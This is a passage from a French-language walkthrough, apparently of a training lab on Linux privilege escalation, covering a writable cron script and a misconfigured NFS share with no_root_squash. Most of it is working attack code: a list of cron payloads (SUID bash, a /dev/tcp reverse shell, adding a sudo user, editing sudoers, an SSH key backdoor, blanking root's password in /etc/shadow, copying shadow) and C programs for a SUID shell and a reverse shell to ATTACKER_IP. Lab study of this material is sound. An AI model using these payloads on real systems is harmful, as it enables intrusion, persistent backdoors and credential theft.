<span id="cb71-75"><a href="#cb71-75" aria-hidden="true" tabindex="-1"></a><span class="op">EOF</span></span>
<span id="cb71-76"><a href="#cb71-76" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb71-77"><a href="#cb71-77" aria-hidden="true" tabindex="-1"></a><span class="fu">chmod</span> +x /usr/local/bin/overwrite.sh</span>
<span id="cb71-78"><a href="#cb71-78" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb71-79"><a href="#cb71-79" aria-hidden="true" tabindex="-1"></a><span class="co"># Attendre, puis se connecter</span></span>
<span id="cb71-80"><a href="#cb71-80" aria-hidden="true" tabindex="-1"></a><span class="fu">su</span> hacker</span>
<span id="cb71-81"><a href="#cb71-81" aria-hidden="true" tabindex="-1"></a><span class="co"># Password: password123</span></span></code></pre></div>
<h3 id="scripts-à-chercher"> Scripts à chercher</h3>
<p><strong>Fichiers potentiellement modifiables :</strong></p>
<div class="sourceCode" id="cb72"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb72-1"><a href="#cb72-1" aria-hidden="true" tabindex="-1"></a><span class="co"># Scripts avec mauvaises permissions</span></span>
<span id="cb72-2"><a href="#cb72-2" aria-hidden="true" tabindex="-1"></a><span class="fu">find</span> /usr/local/bin <span class="at">-writable</span> <span class="at">-type</span> f <span class="dv">2</span><span class="op">&gt;</span>/dev/null</span>
<span id="cb72-3"><a href="#cb72-3" aria-hidden="true" tabindex="-1"></a><span class="fu">find</span> /etc/cron.<span class="pp">*</span> <span class="at">-writable</span> <span class="at">-type</span> f <span class="dv">2</span><span class="op">&gt;</span>/dev/null</span>
<span id="cb72-4"><a href="#cb72-4" aria-hidden="true" tabindex="-1"></a><span class="fu">find</span> / <span class="at">-writable</span> <span class="at">-name</span> <span class="st">&quot;*.sh&quot;</span> <span class="dv">2</span><span class="op">&gt;</span>/dev/null</span>
<span id="cb72-5"><a href="#cb72-5" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb72-6"><a href="#cb72-6" aria-hidden="true" tabindex="-1"></a><span class="co"># Scripts appartenant à votre groupe</span></span>
<span id="cb72-7"><a href="#cb72-7" aria-hidden="true" tabindex="-1"></a><span class="fu">find</span> / <span class="at">-group</span> <span class="va">$(</span><span class="fu">id</span> <span class="at">-gn</span><span class="va">)</span> <span class="at">-name</span> <span class="st">&quot;*.sh&quot;</span> <span class="dv">2</span><span class="op">&gt;</span>/dev/null</span>
<span id="cb72-8"><a href="#cb72-8" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb72-9"><a href="#cb72-9" aria-hidden="true" tabindex="-1"></a><span class="co"># Scripts dans des dossiers accessibles en écriture</span></span>
<span id="cb72-10"><a href="#cb72-10" aria-hidden="true" tabindex="-1"></a><span class="fu">ls</span> <span class="at">-la</span> /tmp/<span class="pp">*</span>.sh</span>
<span id="cb72-11"><a href="#cb72-11" aria-hidden="true" tabindex="-1"></a><span class="fu">ls</span> <span class="at">-la</span> /var/tmp/<span class="pp">*</span>.sh</span>
<span id="cb72-12"><a href="#cb72-12" aria-hidden="true" tabindex="-1"></a><span class="fu">ls</span> <span class="at">-la</span> /dev/shm/<span class="pp">*</span>.sh</span></code></pre></div>
<p><strong>Vérifier les scripts cron :</strong></p>
<div class="sourceCode" id="cb73"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb73-1"><a href="#cb73-1" aria-hidden="true" tabindex="-1"></a><span class="co"># Lister tous les scripts référencés dans les crons</span></span>
<span id="cb73-2"><a href="#cb73-2" aria-hidden="true" tabindex="-1"></a><span class="fu">cat</span> /etc/crontab <span class="kw">|</span> <span class="fu">grep</span> <span class="at">-v</span> <span class="st">&quot;^#&quot;</span> <span class="kw">|</span> <span class="fu">awk</span> <span class="st">&#39;{print $7}&#39;</span></span>
<span id="cb73-3"><a href="#cb73-3" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb73-4"><a href="#cb73-4" aria-hidden="true" tabindex="-1"></a><span class="co"># Vérifier leurs permissions</span></span>
<span id="cb73-5"><a href="#cb73-5" aria-hidden="true" tabindex="-1"></a><span class="cf">for</span> script <span class="kw">in</span> <span class="va">$(</span><span class="fu">cat</span> /etc/crontab <span class="kw">|</span> <span class="fu">grep</span> <span class="at">-v</span> <span class="st">&quot;^#&quot;</span> <span class="kw">|</span> <span class="fu">awk</span> <span class="st">&#39;{print $7}&#39;</span><span class="va">)</span><span class="kw">;</span> <span class="cf">do</span></span>
<span id="cb73-6"><a href="#cb73-6" aria-hidden="true" tabindex="-1"></a>  <span class="cf">if</span> <span class="bu">[</span> <span class="ot">-f</span> <span class="st">&quot;</span><span class="va">$script</span><span class="st">&quot;</span> <span class="bu">]</span><span class="kw">;</span> <span class="cf">then</span></span>
<span id="cb73-7"><a href="#cb73-7" aria-hidden="true" tabindex="-1"></a>    <span class="fu">ls</span> <span class="at">-la</span> <span class="st">&quot;</span><span class="va">$script</span><span class="st">&quot;</span></span>
<span id="cb73-8"><a href="#cb73-8" aria-hidden="true" tabindex="-1"></a>  <span class="cf">fi</span></span>
<span id="cb73-9"><a href="#cb73-9" aria-hidden="true" tabindex="-1"></a><span class="cf">done</span></span></code></pre></div>
<h3 id="payloads-variés"> Payloads variés</h3>
<p><strong>1. Bash SUID (le plus fiable) :</strong></p>
<div class="sourceCode" id="cb74"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb74-1"><a href="#cb74-1" aria-hidden="true" tabindex="-1"></a><span class="co">#!/bin/bash</span></span>
<span id="cb74-2"><a href="#cb74-2" aria-hidden="true" tabindex="-1"></a><span class="fu">cp</span> /bin/bash /tmp/rootbash</span>
<span id="cb74-3"><a href="#cb74-3" aria-hidden="true" tabindex="-1"></a><span class="fu">chmod</span> +s /tmp/rootbash</span></code></pre></div>
<p><strong>2. Reverse Shell :</strong></p>
<div class="sourceCode" id="cb75"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb75-1"><a href="#cb75-1" aria-hidden="true" tabindex="-1"></a><span class="co">#!/bin/bash</span></span>
<span id="cb75-2"><a href="#cb75-2" aria-hidden="true" tabindex="-1"></a><span class="fu">bash</span> <span class="at">-i</span> <span class="op">&gt;&amp;</span> /dev/tcp/10.10.10.10/4444 <span class="dv">0</span><span class="op">&gt;&amp;</span><span class="dv">1</span></span></code></pre></div>
<p><strong>3. Ajouter un utilisateur :</strong></p>
<div class="sourceCode" id="cb76"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb76-1"><a href="#cb76-1" aria-hidden="true" tabindex="-1"></a><span class="co">#!/bin/bash</span></span>
<span id="cb76-2"><a href="#cb76-2" aria-hidden="true" tabindex="-1"></a><span class="ex">useradd</span> <span class="at">-m</span> <span class="at">-s</span> /bin/bash <span class="at">-G</span> sudo hacker</span>
<span id="cb76-3"><a href="#cb76-3" aria-hidden="true" tabindex="-1"></a><span class="bu">echo</span> <span class="st">&#39;hacker:password123&#39;</span> <span class="kw">|</span> <span class="ex">chpasswd</span></span></code></pre></div>
<p><strong>4. Modifier sudoers :</strong></p>
<div class="sourceCode" id="cb77"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb77-1"><a href="#cb77-1" aria-hidden="true" tabindex="-1"></a><span class="co">#!/bin/bash</span></span>
<span id="cb77-2"><a href="#cb77-2" aria-hidden="true" tabindex="-1"></a><span class="bu">echo</span> <span class="st">&#39;user ALL=(ALL) NOPASSWD: ALL&#39;</span> <span class="op">&gt;&gt;</span> /etc/sudoers</span></code></pre></div>
<p><strong>5. Backdoor SSH :</strong></p>
<div class="sourceCode" id="cb78"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb78-1"><a href="#cb78-1" aria-hidden="true" tabindex="-1"></a><span class="co">#!/bin/bash</span></span>
<span id="cb78-2"><a href="#cb78-2" aria-hidden="true" tabindex="-1"></a><span class="fu">mkdir</span> <span class="at">-p</span> /root/.ssh</span>
<span id="cb78-3"><a href="#cb78-3" aria-hidden="true" tabindex="-1"></a><span class="fu">cat</span> <span class="op">&gt;</span> /root/.ssh/authorized_keys <span class="op">&lt;&lt; &#39;KEY&#39;</span></span>
<span id="cb78-4"><a href="#cb78-4" aria-hidden="true" tabindex="-1"></a><span class="st">ssh-rsa AAAA...your_key</span></span>
<span id="cb78-5"><a href="#cb78-5" aria-hidden="true" tabindex="-1"></a><span class="op">KEY</span></span>
<span id="cb78-6"><a href="#cb78-6" aria-hidden="true" tabindex="-1"></a><span class="fu">chmod</span> 600 /root/.ssh/authorized_keys</span></code></pre></div>
<p><strong>6. Vider le mot de passe root :</strong></p>
<div class="sourceCode" id="cb79"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb79-1"><a href="#cb79-1" aria-hidden="true" tabindex="-1"></a><span class="co">#!/bin/bash</span></span>
<span id="cb79-2"><a href="#cb79-2" aria-hidden="true" tabindex="-1"></a><span class="fu">sed</span> <span class="at">-i</span> <span class="st">&#39;s/^root:[^:]*:/root::/&#39;</span> /etc/shadow</span></code></pre></div>
<p><strong>7. Copier /etc/shadow :</strong></p>
<div class="sourceCode" id="cb80"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb80-1"><a href="#cb80-1" aria-hidden="true" tabindex="-1"></a><span class="co">#!/bin/bash</span></span>
<span id="cb80-2"><a href="#cb80-2" aria-hidden="true" tabindex="-1"></a><span class="fu">cp</span> /etc/shadow /tmp/shadow_backup</span>
<span id="cb80-3"><a href="#cb80-3" aria-hidden="true" tabindex="-1"></a><span class="fu">chmod</span> 644 /tmp/shadow_backup</span></code></pre></div>
<h3 id="surveillance-de-lexécution"> Surveillance de l’exécution</h3>
<div class="sourceCode" id="cb81"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb81-1"><a href="#cb81-1" aria-hidden="true" tabindex="-1"></a><span class="co"># Méthode 1: watch</span></span>
<span id="cb81-2"><a href="#cb81-2" aria-hidden="true" tabindex="-1"></a><span class="ex">watch</span> <span class="at">-n</span> 1 <span class="st">&#39;ls -la /tmp/rootbash&#39;</span></span>
<span id="cb81-3"><a href="#cb81-3" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb81-4"><a href="#cb81-4" aria-hidden="true" tabindex="-1"></a><span class="co"># Méthode 2: while loop</span></span>
<span id="cb81-5"><a href="#cb81-5" aria-hidden="true" tabindex="-1"></a><span class="cf">while</span> <span class="bu">[</span> <span class="ot">!</span> <span class="ot">-f</span> /tmp/rootbash <span class="bu">]</span><span class="kw">;</span> <span class="cf">do</span></span>
<span id="cb81-6"><a href="#cb81-6" aria-hidden="true" tabindex="-1"></a>  <span class="bu">echo</span> <span class="st">&quot;Waiting for cron...&quot;</span></span>
<span id="cb81-7"><a href="#cb81-7" aria-hidden="true" tabindex="-1"></a>  <span class="fu">sleep</span> 1</span>
<span id="cb81-8"><a href="#cb81-8" aria-hidden="true" tabindex="-1"></a><span class="cf">done</span></span>
<span id="cb81-9"><a href="#cb81-9" aria-hidden="true" tabindex="-1"></a><span class="bu">echo</span> <span class="st">&quot;Rootbash created!&quot;</span></span>
<span id="cb81-10"><a href="#cb81-10" aria-hidden="true" tabindex="-1"></a><span class="ex">/tmp/rootbash</span> <span class="at">-p</span></span>
<span id="cb81-11"><a href="#cb81-11" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb81-12"><a href="#cb81-12" aria-hidden="true" tabindex="-1"></a><span class="co"># Méthode 3: pspy</span></span>
<span id="cb81-13"><a href="#cb81-13" aria-hidden="true" tabindex="-1"></a><span class="ex">./pspy64</span> <span class="kw">|</span> <span class="fu">grep</span> overwrite.sh</span></code></pre></div>
<h3 id="vérification-des-permissions"> Vérification des
permissions</h3>
<div class="sourceCode" id="cb82"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb82-1"><a href="#cb82-1" aria-hidden="true" tabindex="-1"></a><span class="co"># Vérifier si vous pouvez écrire</span></span>
<span id="cb82-2"><a href="#cb82-2" aria-hidden="true" tabindex="-1"></a><span class="bu">test</span> <span class="at">-w</span> /usr/local/bin/overwrite.sh <span class="kw">&amp;&amp;</span> <span class="bu">echo</span> <span class="st">&quot;Writable!&quot;</span></span>
<span id="cb82-3"><a href="#cb82-3" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb82-4"><a href="#cb82-4" aria-hidden="true" tabindex="-1"></a><span class="co"># Vérifier le propriétaire</span></span>
<span id="cb82-5"><a href="#cb82-5" aria-hidden="true" tabindex="-1"></a><span class="fu">ls</span> <span class="at">-la</span> /usr/local/bin/overwrite.sh</span>
<span id="cb82-6"><a href="#cb82-6" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb82-7"><a href="#cb82-7" aria-hidden="true" tabindex="-1"></a><span class="co"># Vérifier les ACL (Access Control Lists)</span></span>
<span id="cb82-8"><a href="#cb82-8" aria-hidden="true" tabindex="-1"></a><span class="ex">getfacl</span> /usr/local/bin/overwrite.sh</span></code></pre></div>
<h3 id="réponse-17"> Réponse</h3>
<p>Shell root obtenu via modification de script cron</p>
<hr />
<h2
id="task-19---privilege-escalation---nfs-root-squashing"><a name="task-19"></a>Task
19 - Privilege Escalation - NFS Root Squashing</h2>
<h3 id="objectif-18"> Objectif</h3>
<p>Exploiter un partage NFS mal configuré sans root_squash pour créer un
binaire SUID.</p>
<h3 id="commandes-18"> Commandes</h3>
<p><strong>SUR LA MACHINE CIBLE (victim) :</strong></p>
<div class="sourceCode" id="cb83"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb83-1"><a href="#cb83-1" aria-hidden="true" tabindex="-1"></a><span class="co"># 1. Vérifier les exports NFS</span></span>
<span id="cb83-2"><a href="#cb83-2" aria-hidden="true" tabindex="-1"></a><span class="fu">cat</span> /etc/exports</span>
<span id="cb83-3"><a href="#cb83-3" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb83-4"><a href="#cb83-4" aria-hidden="true" tabindex="-1"></a><span class="co"># Exemple de configuration vulnérable:</span></span>
<span id="cb83-5"><a href="#cb83-5" aria-hidden="true" tabindex="-1"></a><span class="co"># /tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)</span></span>
<span id="cb83-6"><a href="#cb83-6" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb83-7"><a href="#cb83-7" aria-hidden="true" tabindex="-1"></a><span class="co"># no_root_squash = le root sur le client reste root sur le serveur!</span></span>
<span id="cb83-8"><a href="#cb83-8" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb83-9"><a href="#cb83-9" aria-hidden="true" tabindex="-1"></a><span class="co"># 2. Vérifier les partages montés</span></span>
<span id="cb83-10"><a href="#cb83-10" aria-hidden="true" tabindex="-1"></a><span class="ex">showmount</span> <span class="at">-e</span> MACHINE_IP</span>
<span id="cb83-11"><a href="#cb83-11" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb83-12"><a href="#cb83-12" aria-hidden="true" tabindex="-1"></a><span class="co"># Sortie:</span></span>
<span id="cb83-13"><a href="#cb83-13" aria-hidden="true" tabindex="-1"></a><span class="co"># /tmp *</span></span>
<span id="cb83-14"><a href="#cb83-14" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb83-15"><a href="#cb83-15" aria-hidden="true" tabindex="-1"></a><span class="co"># 3. Noter l&#39;adresse IP de la machine</span></span>
<span id="cb83-16"><a href="#cb83-16" aria-hidden="true" tabindex="-1"></a><span class="ex">ip</span> addr</span></code></pre></div>
<p><strong>SUR VOTRE MACHINE D’ATTAQUE (AttackBox) :</strong></p>
<div class="sourceCode" id="cb84"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb84-1"><a href="#cb84-1" aria-hidden="true" tabindex="-1"></a><span class="co"># 4. Vérifier les partages disponibles</span></span>
<span id="cb84-2"><a href="#cb84-2" aria-hidden="true" tabindex="-1"></a><span class="ex">showmount</span> <span class="at">-e</span> VICTIM_IP</span>
<span id="cb84-3"><a href="#cb84-3" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb84-4"><a href="#cb84-4" aria-hidden="true" tabindex="-1"></a><span class="co"># 5. Créer un point de montage</span></span>
<span id="cb84-5"><a href="#cb84-5" aria-hidden="true" tabindex="-1"></a><span class="fu">mkdir</span> <span class="at">-p</span> /tmp/nfs_mount</span>
<span id="cb84-6"><a href="#cb84-6" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb84-7"><a href="#cb84-7" aria-hidden="true" tabindex="-1"></a><span class="co"># 6. Monter le partage NFS</span></span>
<span id="cb84-8"><a href="#cb84-8" aria-hidden="true" tabindex="-1"></a><span class="fu">mount</span> <span class="at">-o</span> rw VICTIM_IP:/tmp /tmp/nfs_mount</span>
<span id="cb84-9"><a href="#cb84-9" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb84-10"><a href="#cb84-10" aria-hidden="true" tabindex="-1"></a><span class="co"># 7. Vérifier le montage</span></span>
<span id="cb84-11"><a href="#cb84-11" aria-hidden="true" tabindex="-1"></a><span class="fu">df</span> <span class="at">-h</span> <span class="kw">|</span> <span class="fu">grep</span> nfs</span>
<span id="cb84-12"><a href="#cb84-12" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb84-13"><a href="#cb84-13" aria-hidden="true" tabindex="-1"></a><span class="co"># 8. MÉTHODE 1 - Créer un bash SUID</span></span>
<span id="cb84-14"><a href="#cb84-14" aria-hidden="true" tabindex="-1"></a><span class="co"># Copier bash dans le partage NFS</span></span>
<span id="cb84-15"><a href="#cb84-15" aria-hidden="true" tabindex="-1"></a><span class="fu">cp</span> /bin/bash /tmp/nfs_mount/rootbash</span>
<span id="cb84-16"><a href="#cb84-16" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb84-17"><a href="#cb84-17" aria-hidden="true" tabindex="-1"></a><span class="co"># Set le bit SUID (en tant que root sur votre machine)</span></span>
<span id="cb84-18"><a href="#cb84-18" aria-hidden="true" tabindex="-1"></a><span class="fu">chmod</span> +s /tmp/nfs_mount/rootbash</span>
<span id="cb84-19"><a href="#cb84-19" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb84-20"><a href="#cb84-20" aria-hidden="true" tabindex="-1"></a><span class="co"># Vérifier les permissions</span></span>
<span id="cb84-21"><a href="#cb84-21" aria-hidden="true" tabindex="-1"></a><span class="fu">ls</span> <span class="at">-la</span> /tmp/nfs_mount/rootbash</span>
<span id="cb84-22"><a href="#cb84-22" aria-hidden="true" tabindex="-1"></a><span class="co"># -rwsr-sr-x ... rootbash</span></span></code></pre></div>
<p><strong>RETOUR SUR LA MACHINE CIBLE (victim) :</strong></p>
<div class="sourceCode" id="cb85"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb85-1"><a href="#cb85-1" aria-hidden="true" tabindex="-1"></a><span class="co"># 9. Vérifier que le fichier est créé avec SUID</span></span>
<span id="cb85-2"><a href="#cb85-2" aria-hidden="true" tabindex="-1"></a><span class="fu">ls</span> <span class="at">-la</span> /tmp/rootbash</span>
<span id="cb85-3"><a href="#cb85-3" aria-hidden="true" tabindex="-1"></a><span class="co"># -rwsr-sr-x 1 root root ... rootbash</span></span>
<span id="cb85-4"><a href="#cb85-4" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb85-5"><a href="#cb85-5" aria-hidden="true" tabindex="-1"></a><span class="co"># 10. Exécuter le bash SUID</span></span>
<span id="cb85-6"><a href="#cb85-6" aria-hidden="true" tabindex="-1"></a><span class="ex">/tmp/rootbash</span> <span class="at">-p</span></span>
<span id="cb85-7"><a href="#cb85-7" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb85-8"><a href="#cb85-8" aria-hidden="true" tabindex="-1"></a><span class="co"># 11. Vérifier que vous êtes root</span></span>
<span id="cb85-9"><a href="#cb85-9" aria-hidden="true" tabindex="-1"></a><span class="fu">id</span></span>
<span id="cb85-10"><a href="#cb85-10" aria-hidden="true" tabindex="-1"></a><span class="co"># uid=1000(user) gid=1000(user) euid=0(root) egid=0(root) ...</span></span>
<span id="cb85-11"><a href="#cb85-11" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb85-12"><a href="#cb85-12" aria-hidden="true" tabindex="-1"></a><span class="fu">whoami</span></span>
<span id="cb85-13"><a href="#cb85-13" aria-hidden="true" tabindex="-1"></a><span class="co"># root</span></span>
<span id="cb85-14"><a href="#cb85-14" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb85-15"><a href="#cb85-15" aria-hidden="true" tabindex="-1"></a><span class="co"># 12. Lire le flag</span></span>
<span id="cb85-16"><a href="#cb85-16" aria-hidden="true" tabindex="-1"></a><span class="fu">cat</span> /root/flag.txt</span>
<span id="cb85-17"><a href="#cb85-17" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb85-18"><a href="#cb85-18" aria-hidden="true" tabindex="-1"></a><span class="co"># MÉTHODE 2 - Créer un binaire SUID custom</span></span></code></pre></div>
<p><strong>SUR VOTRE MACHINE D’ATTAQUE :</strong></p>
<div class="sourceCode" id="cb86"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb86-1"><a href="#cb86-1" aria-hidden="true" tabindex="-1"></a><span class="co"># 13. Créer un programme C</span></span>
<span id="cb86-2"><a href="#cb86-2" aria-hidden="true" tabindex="-1"></a><span class="fu">cat</span> <span class="op">&gt;</span> /tmp/nfs_mount/suid.c <span class="op">&lt;&lt; &#39;EOF&#39;</span></span>
<span id="cb86-3"><a href="#cb86-3" aria-hidden="true" tabindex="-1"></a><span class="st">#include &lt;stdio.h&gt;</span></span>
<span id="cb86-4"><a href="#cb86-4" aria-hidden="true" tabindex="-1"></a><span class="st">#include &lt;stdlib.h&gt;</span></span>
<span id="cb86-5"><a href="#cb86-5" aria-hidden="true" tabindex="-1"></a><span class="st">#include &lt;sys/types.h&gt;</span></span>
<span id="cb86-6"><a href="#cb86-6" aria-hidden="true" tabindex="-1"></a><span class="st">#include &lt;unistd.h&gt;</span></span>
<span id="cb86-7"><a href="#cb86-7" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb86-8"><a href="#cb86-8" aria-hidden="true" tabindex="-1"></a><span class="st">int main() {</span></span>
<span id="cb86-9"><a href="#cb86-9" aria-hidden="true" tabindex="-1"></a><span class="st">    setuid(0);</span></span>
<span id="cb86-10"><a href="#cb86-10" aria-hidden="true" tabindex="-1"></a><span class="st">    setgid(0);</span></span>
<span id="cb86-11"><a href="#cb86-11" aria-hidden="true" tabindex="-1"></a><span class="st">    system(&quot;/bin/bash -p&quot;);</span></span>
<span id="cb86-12"><a href="#cb86-12" aria-hidden="true" tabindex="-1"></a><span class="st">    return 0;</span></span>
<span id="cb86-13"><a href="#cb86-13" aria-hidden="true" tabindex="-1"></a><span class="st">}</span></span>
<span id="cb86-14"><a href="#cb86-14" aria-hidden="true" tabindex="-1"></a><span class="op">EOF</span></span>
<span id="cb86-15"><a href="#cb86-15" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb86-16"><a href="#cb86-16" aria-hidden="true" tabindex="-1"></a><span class="co"># 14. Compiler le programme</span></span>
<span id="cb86-17"><a href="#cb86-17" aria-hidden="true" tabindex="-1"></a><span class="fu">gcc</span> /tmp/nfs_mount/suid.c <span class="at">-o</span> /tmp/nfs_mount/suid</span>
<span id="cb86-18"><a href="#cb86-18" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb86-19"><a href="#cb86-19" aria-hidden="true" tabindex="-1"></a><span class="co"># 15. Set le bit SUID</span></span>
<span id="cb86-20"><a href="#cb86-20" aria-hidden="true" tabindex="-1"></a><span class="fu">chmod</span> +s /tmp/nfs_mount/suid</span>
<span id="cb86-21"><a href="#cb86-21" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb86-22"><a href="#cb86-22" aria-hidden="true" tabindex="-1"></a><span class="co"># 16. Vérifier</span></span>
<span id="cb86-23"><a href="#cb86-23" aria-hidden="true" tabindex="-1"></a><span class="fu">ls</span> <span class="at">-la</span> /tmp/nfs_mount/suid</span></code></pre></div>
<p><strong>RETOUR SUR LA MACHINE CIBLE :</strong></p>
<div class="sourceCode" id="cb87"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb87-1"><a href="#cb87-1" aria-hidden="true" tabindex="-1"></a><span class="co"># 17. Exécuter le binaire SUID</span></span>
<span id="cb87-2"><a href="#cb87-2" aria-hidden="true" tabindex="-1"></a><span class="ex">/tmp/suid</span></span>
<span id="cb87-3"><a href="#cb87-3" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb87-4"><a href="#cb87-4" aria-hidden="true" tabindex="-1"></a><span class="co"># MÉTHODE 3 - Payload reverse shell</span></span></code></pre></div>
<p><strong>SUR VOTRE MACHINE D’ATTAQUE :</strong></p>
<div class="sourceCode" id="cb88"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb88-1"><a href="#cb88-1" aria-hidden="true" tabindex="-1"></a><span class="co"># 18. Créer un reverse shell SUID</span></span>
<span id="cb88-2"><a href="#cb88-2" aria-hidden="true" tabindex="-1"></a><span class="fu">cat</span> <span class="op">&gt;</span> /tmp/nfs_mount/reverse.c <span class="op">&lt;&lt; &#39;EOF&#39;</span></span>
<span id="cb88-3"><a href="#cb88-3" aria-hidden="true" tabindex="-1"></a><span class="st">#include &lt;stdio.h&gt;</span></span>
<span id="cb88-4"><a href="#cb88-4" aria-hidden="true" tabindex="-1"></a><span class="st">#include &lt;stdlib.h&gt;</span></span>
<span id="cb88-5"><a href="#cb88-5" aria-hidden="true" tabindex="-1"></a><span class="st">#include &lt;sys/types.h&gt;</span></span>
<span id="cb88-6"><a href="#cb88-6" aria-hidden="true" tabindex="-1"></a><span class="st">#include &lt;unistd.h&gt;</span></span>
<span id="cb88-7"><a href="#cb88-7" aria-hidden="true" tabindex="-1"></a><span class="st">#include &lt;sys/socket.h&gt;</span></span>
<span id="cb88-8"><a href="#cb88-8" aria-hidden="true" tabindex="-1"></a><span class="st">#include &lt;netinet/in.h&gt;</span></span>
<span id="cb88-9"><a href="#cb88-9" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb88-10"><a href="#cb88-10" aria-hidden="true" tabindex="-1"></a><span class="st">int main() {</span></span>
<span id="cb88-11"><a href="#cb88-11" aria-hidden="true" tabindex="-1"></a><span class="st">    setuid(0);</span></span>
<span id="cb88-12"><a href="#cb88-12" aria-hidden="true" tabindex="-1"></a><span class="st">    setgid(0);</span></span>
<span id="cb88-13"><a href="#cb88-13" aria-hidden="true" tabindex="-1"></a><span class="st">    </span></span>
<span id="cb88-14"><a href="#cb88-14" aria-hidden="true" tabindex="-1"></a><span class="st">    int sockfd = socket(AF_INET, SOCK_STREAM, 0);</span></span>
<span id="cb88-15"><a href="#cb88-15" aria-hidden="true" tabindex="-1"></a><span class="st">    struct sockaddr_in addr;</span></span>
<span id="cb88-16"><a href="#cb88-16" aria-hidden="true" tabindex="-1"></a><span class="st">    addr.sin_family = AF_INET;</span></span>
<span id="cb88-17"><a href="#cb88-17" aria-hidden="true" tabindex="-1"></a><span class="st">    addr.sin_port = htons(4444);</span></span>
<span id="cb88-18"><a href="#cb88-18" aria-hidden="true" tabindex="-1"></a><span class="st">    addr.sin_addr.s_addr = inet_addr(&quot;ATTACKER_IP&quot;);</span></span>
<span id="cb88-19"><a href="#cb88-19" aria-hidden="true" tabindex="-1"></a><span class="st">    </span></span>
<span id="cb88-20"><a href="#cb88-20" aria-hidden="true" tabindex="-1"></a><span class="st">    connect(sockfd, (struct sockaddr *)&amp;addr, sizeof(addr));</span></span>
<span id="cb88-21"><a href="#cb88-21" aria-hidden="true" tabindex="-1"></a><span class="st">    dup2(sockfd, 0);</span></span>
<span id="cb88-22"><a href="#cb88-22" aria-hidden="true" tabindex="-1"></a><span class="st">    dup2(sockfd, 1);</span></span>
<span id="cb88-23"><a href="#cb88-23" aria-hidden="true" tabindex="-1"></a><span class="st">    dup2(sockfd, 2);</span></span>
<span id="cb88-24"><a href="#cb88-24" aria-hidden="true" tabindex="-1"></a><span class="st">    execve(&quot;/bin/bash&quot;, NULL, NULL);</span></span>
<span id="cb88-25"><a href="#cb88-25" aria-hidden="true" tabindex="-1"></a><span class="st">    return 0;</span></span>
<span id="cb88-26"><a href="#cb88-26" aria-hidden="true" tabindex="-1"></a><span class="st">}</span></span>
<span id="cb88-27"><a href="#cb88-27" aria-hidden="true" tabindex="-1"></a><span class="op">EOF</span></span>
<span id="cb88-28"><a href="#cb88-28" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb88-29"><a href="#cb88-29" aria-hidden="true" tabindex="-1"></a><span class="co"># Compiler et set SUID</span></span>
<span id="cb88-30"><a href="#cb88-30" aria-hidden="true" tabindex="-1"></a><span class="fu">gcc</span> /tmp/nfs_mount/reverse.c <span class="at">-o</span> /tmp/nfs_mount/reverse</span>
<span id="cb88-31"><a href="#cb88-31" aria-hidden="true" tabindex="-1"></a><span class="fu">chmod</span> +s /tmp/nfs_mount/reverse</span>
<span id="cb88-32"><a href="#cb88-32" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb88-33"><a href="#cb88-33" aria-hidden="true" tabindex="-1"></a><span class="co"># Démarrer le listener</span></span>
<span id="cb88-34"><a href="#cb88-34" aria-hidden="true" tabindex="-1"></a><span class="ex">nc</span> <span class="at">-lvnp</span> 4444</span></code></pre></div>
<p><strong>RETOUR SUR LA MACHINE CIBLE :</strong></p>
<div class="sourceCode" id="cb89"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb89-1"><a href="#cb89-1" aria-hidden="true" tabindex="-1"></a><span class="co"># 19. Exécuter le reverse shell SUID</span></span>
<span id="cb89-2"><a href="#cb89-2" aria-hidden="true" tabindex="-1"></a><span class="ex">/tmp/reverse</span></span></code></pre></div>
<h3 id="explication-de-lattaque"> Explication de l’attaque</h3>
<p><strong>Root Squashing :</strong> - Par défaut, NFS “squash” le root
